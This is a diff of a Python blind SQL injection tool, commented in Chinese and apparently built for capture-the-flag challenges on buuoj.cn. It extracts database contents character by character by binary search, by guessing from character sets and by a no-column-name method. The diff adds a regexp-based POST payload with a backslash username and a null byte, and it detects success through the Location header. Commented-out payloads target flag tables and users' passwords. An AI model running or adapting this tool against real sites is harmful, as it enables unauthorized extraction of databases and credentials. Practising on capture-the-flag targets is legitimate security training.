@@ -1,3 +1,6 @@
+from email import header
+from operator import mod
+from flask import redirect
 import requests as res
 import string
 import traceback
@@ -14,9 +17,9 @@ import time
 #
 #                |             <-         ^
 #                V                        |
-#        -> binarySearch  
-#   main                   ->  req  ->  check   -> 总的盲注数据(因为测字段长度感觉没必要,所以每匹配成功就会输出一次新数据)
-#        -> characterSet
+#          
+#   main     XXXsearch         ->        req  ->  check   -> 总的盲注数据(因为测字段长度感觉没必要,所以每匹配成功就会输出一次新数据)
+#        
 #                ^                        |
 #                |             <-         V
 #
@@ -25,24 +28,35 @@ url=""
 reqMethod=""
 checkMethod=""
 keyString=""
+headerKey=""
+headerValue=""
+redirects=True
 length=0
 sleep=0
-def main(theUrl,method,theReqMethod="get",theCheckMethod="textA",theKeyString="",setNum=1,theLength=32,theSleep=0.3):
-    global url,reqMethod,checkMethod,keyString,length,sleep
+def main(theUrl,method,theReqMethod="get",theCheckMethod="textA",theKeyString="",setNum=1,theLength=32,theSleep=0.3,theHeaderKey="",theHeaderValue="",redirect=True):
+    global url,reqMethod,checkMethod,keyString,length,sleep,headerKey,headerValue,redirects
     url=theUrl
     reqMethod=theReqMethod
     checkMethod=theCheckMethod
     keyString=theKeyString
     length=theLength
     sleep=theSleep
+    headerKey=theHeaderKey
+    headerValue=theHeaderValue
+    redirects=redirect
     if(method=="bs"):
         binarySearch()
-    elif(method=="cs"):
-        characterSet(setNum)
+    elif(method[:2]=="cs"):
+        model=method[2:]
+        if(model=="A" or model=="B"):
+            characterSet(setNum,model=model)
+        else:
+            print("[+]Invalid cs method")
+            exit()
     elif(method=="nc"):
         NoColumns(setNum)
     else:
-        print("[+]Invalid ethod")
+        print("[+]Invalid method")
         exit()
 
 def binarySearch(thePrv=32,theLast=126):
@@ -91,7 +105,7 @@ def binarySearch(thePrv=32,theLast=126):
             print("[+]Matched!Now result:{}".format(result))
     print("[+]The full result:{}".format(result))
 
-def characterSet(setNum=1):
+def characterSet(setNum=1,model="A"):
     #setNum为将使用的字符集
     #字母集存储在getCharacterSet函数中
     targetCharSet=getCharacterSet(setNum)
@@ -103,7 +117,10 @@ def characterSet(setNum=1):
             break
         for char in targetCharSet:
             print("[+]Testing:{}=>{}".format(num,char))
-            checkFlag=req(char=char,num=num)
+            if model=="A":
+                checkFlag=req(char=char,num=num)
+            elif model=="B":
+                checkFlag=req(char=result+char)
             if checkFlag:
                 result+=char
                 print("[+]Matched!Now result:{}".format(result))
@@ -113,12 +130,13 @@ def characterSet(setNum=1):
                 break
     print("[+]The full result:{}".format(result))
 
+
 def NoColumns(setNum):
     #用nc前需要把除了测试字段外其余字段值整出来
     #目前依据[GYCTF2020]Ezsqli构造的这个方法
     #sympol用小于号也行没啥区别
     targetCharSet=getCharacterSet(setNum)
-    result="flag{f10eb2b6-2ce3-45db-bcef-77829"
+    result=""
     sympol=">"
     endFlag=False
     for num in range(1,length):
@@ -150,19 +168,22 @@ def getCharacterSet(num):
         2:string.digits+"abcdef"+"{}-",     #flag字符
         3:"!#$%&()*+,-./:;<=>?@[\]^_`{|}~",       #除开单双引号的标点字符
         4:string.ascii_letters+string.digits+"!#$%&()*+,-./:;<=>?@[\]^_`{|}~",   #所有除开单双引号可见字符
-        5:string.ascii_lowercase+"0123456789"+"{}_@%,.<>=-"    #感觉可能用的最多的
+        5:string.ascii_lowercase+"0123456789"+"{}_@%,.<>=-",    #感觉可能用的最多的
+        6:string.ascii_lowercase+"0123456789"+"_-"   #5的简化版本
     }
     return charSet[num]
 
-
 def req(num=0,char="",sympol="",code=0):
-    #num为当前字段的第几位,cs和bs均提供
-    #char为猜测的字符,cs和nc提供,注意nc提供的char携带额外1位(共两位)字符辅助判断
+    #num为当前字段的第几位,csA和bs均提供
+    #char为猜测的字符,csX和nc提供
+    #   nc提供的char携带额外1位(共两位)字符辅助判断
+    #   csA提供单独猜测字符,csB提供包含已测出字符串的结果字符串
     #code为猜测的字符的ascii值,仅bs提供
     #sympol为二分使用的判断符号,bs和nc提供
     #综上
     # bs : num code sympol
-    # cs : num char
+    # csA : num char
+    # csB : char
     # nc : char sympol
     timeOutFlag=False
     httpReq=False
@@ -186,16 +207,14 @@ def req(num=0,char="",sympol="",code=0):
                 #"path":"or ascii(substr((select password from users),{},1)){}{}#".format(num,sympol,code)
 
             }
-            httpReq=getattr(res,reqMethod)(url=url,params=params,headers=header,cookies=cookie,timeout=timeOut)
+            httpReq=getattr(res,reqMethod)(url=url,params=params,headers=header,cookies=cookie,timeout=timeOut,allow_redirects=redirects)
         elif(reqMethod=="post"):
             #在这里构造post数据
             data={
-                #"id":'1^(select(ascii(substr((select(group_concat(table_name))from(sys.schema_table_statistics_with_buffer)where(table_schema=database())),{},1)){}{}))^1'.format(num,sympol,code)
-                #"id":'1^(select(ascii(substr((select(f1ag)from(f1ag_1s_h3r3_hhhhh)),{},1)){}{}))^1'
-                "id":'1^(select((select 1,"{}"){}(select * from f1ag_1s_h3r3_hhhhh)))^1'.format(char,sympol)
-            }   
-            #print(data)
-            httpReq=getattr(res,reqMethod)(url=url,data=data,headers=header,cookies=cookie,timeout=timeOut)
+                "username":"\\",
+                "passwd":'||\x09passwd\x09regexp\x09"^{}";\x00'.format(char)
+            }
+            httpReq=getattr(res,reqMethod)(url=url,data=data,headers=header,cookies=cookie,timeout=timeOut,allow_redirects=redirects)
         else:
             print("[+]Invalid reqMethod")
             exit()
@@ -222,15 +241,26 @@ def check(httpReq=False,timeFlag=False):
         exit()
     if(checkMethod[:4]=="text"):
         text=httpReq.text
-        print("[+]Lenght of text:{}".format(len(text)))
+        headers=httpReq.headers
         if(checkMethod[4:]=="A"):
+            print("[+]Lenght of text:{}".format(len(text)))
             if(text.find(keyString)!=-1):
                 return True
             else:
                 return False
         elif(checkMethod[4:]=="B"):
+            print("[+]Lenght of text:{}".format(len(text)))
             if(text!=''):
                 return True
+            else:
+                return False
+        elif(checkMethod[4:]=="C"):
+            print("[+]The header:{}".format(headers.get(headerKey)))
+            if(headers.get(headerKey)!=None):
+                if(headers.get(headerKey).find(headerValue)!=-1):
+                    return True
+                else:
+                    return False
             else:
                 return False
     elif(checkMethod[:4]=="time"):
@@ -244,34 +274,37 @@ def check(httpReq=False,timeFlag=False):
 
 if __name__ == '__main__' :
     #用前须知
-    #[1]此处选择执行方式
+    #[1]main配置参数
     #[2]req构造具体payload
     #[3]对check配置(可能需要)
-    #[4]挑选或者构造字符集(cs模式时才需要)
-    #[5]bs方法有两个实现方法,可以自行选择(bs模式时才需要)
     '''
     url             具体提交数据的页面的URL
-    method          盲注的方法,有bs代表的二分法、cs代表的字符集、nc代表的无列名三种
+    method          盲注的方法,有bs代表的二分法、csX代表的字符集、nc代表的无列名三种
+                    其中csX分为,csA为不积累成功匹配参与下次匹配,csB为积累成功匹配参与下次匹配
     theCheckMethod  检查方式textX和timeX两种(前4字母代表主方式,最后X代表次方式)
-                    X可以为A代表关键字B代表检测图片
-                    X为纯数字代表超时时间(可以写小数)
-                    默认为textA
-                    添了个没写的else
-    setNum          cs或nc方式用的字数集序号,默认为1,采用cs或nc方式时需要考虑
+                    对于textX:X可以为A代表关键字B代表检测图片C代表返回行
+                    对于timeX:X为纯数字代表超时时间(可以写小数)
+                    默认为textA(添了个没写的else)
+    setNum          csX、nc方式采用的字数集序号,默认为1
     theReqMethod    请求方式,get和post两种,默认为GET
-    theKeyString    用来判断的关键字,默认为空需要自己传入 
-    theLength       设置字段的最大长度,默认为32
+    theKeyString    用来判断的关键字,默认为空需要自己传入,textA模式使用
+    theLength       设置匹配字段的最大长度,默认为32
     sleep           每次请求后的睡眠时间,防止429,默认0.3秒
+    theHeaderKey    用来判断的返回行,默认为空需要自己传入,textC模式使用
+    theHeaderValue  用来判断的返回行的值,默认为空需要自己传入,textC模式使用
+    redirek         设置是否自动跟随页面,比如有Loaction就会自动跟过去
     '''
-    url="http://f1dbd963-b5be-469d-9489-d847a6739e23.node4.buuoj.cn:81/index.php"
-    method="nc"
-    theCheckMethod="textA"
+    url="http://8d7db3a5-3d71-4eb0-98b9-37bfbb0e995e.node4.buuoj.cn:81/index.php"
+    method="csB"
+    theCheckMethod="textC"
     length=50
     theReqMethod="post"
-    theKeyString="Nu1L"
-    setNum=2
+    theHeaderKey="Location"
+    theHeaderValue="welcome.php"
+    setNum=6
     sleep=0.5
-    main(theUrl=url,method=method,theCheckMethod=theCheckMethod,theLength=length,theReqMethod=theReqMethod,theKeyString=theKeyString,setNum=setNum,theSleep=sleep)
+    redirek=False
+    main(theUrl=url,method=method,theCheckMethod=theCheckMethod,theLength=length,theReqMethod=theReqMethod,theHeaderKey=theHeaderKey,theHeaderValue=theHeaderValue,setNum=setNum,theSleep=sleep,redirect=redirek)
     #setNum=0
     #theReqMethod=''
     #theKeyString=""
